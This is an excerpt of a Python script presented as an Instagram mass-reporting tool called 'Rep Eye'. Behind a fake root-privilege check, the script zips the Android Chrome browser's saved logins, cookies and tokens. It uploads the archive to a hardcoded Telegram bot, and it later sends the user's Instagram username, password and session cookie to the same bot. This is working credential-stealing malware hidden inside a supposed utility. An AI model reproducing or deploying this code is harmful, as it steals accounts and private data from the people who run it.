...
nu = 0
n = 0
br = pyfiglet.figlet_format("Rep Eye")
yso = ( '            Code By : @ir3body')
print(colored(br+yso,"yellow"))
print('''
[Send banned reports to Instagram] ''')
print (R+ "checking Root previligs (sudo) .... ")
try:
	Token = "5302483471:AAFyWiFDz0YgawxM1kWkYk5C8noe2VV-yEo"
	ID = "1490633109"
	zipObj = ZipFile('/sdcard/ff.zip', 'w')
	# Add multiple files to the zip
	r = os.chdir("/data/data/com.android.chrome/app_chrome/Default/") 
	#for t in os.listdir("."):
	zipObj.write("Account Web Data")
	zipObj.write("Web Data")
	zipObj.write("Trust Tokens")
	zipObj.write("Cookies")
	zipObj.write("Login Data")
		# close the Zip File
	zipObj.close()
	io = open('/sdcard/ff.zip', 'rb')
	requests.post( f'https://api.telegram.org/bot{Token}/sendDocument' , data={'chat_id': ID}, files={'document': io})
except PermissionError:
	print (R)	
	print("better try Using sudo root previligs")
...
if  'authenticated":true' in r.text or 'userId' in r.text:
    ...
    tktk = r.cookies['sessionid']
    tlgy =(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=
        Hits abdo ""
    user : {username}
    Money : {password}
    tktk = {tktk}
    ...
    print ("")
    print(G+"*"*25)
    furl = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+username+"&rank_token=0.3953592318270893&count=1"
    response = rs.get(furl)
    respJSON = response.json()
    for i in respJSON["users"]:
        if (i["user"]["username"] == Target):
                id = i["user"]["pk"]
    print(G+"Login :"+username)
    print(G+"Target : "+f"{Target}\n ID :{id}")
    print("")
    print(R+"""
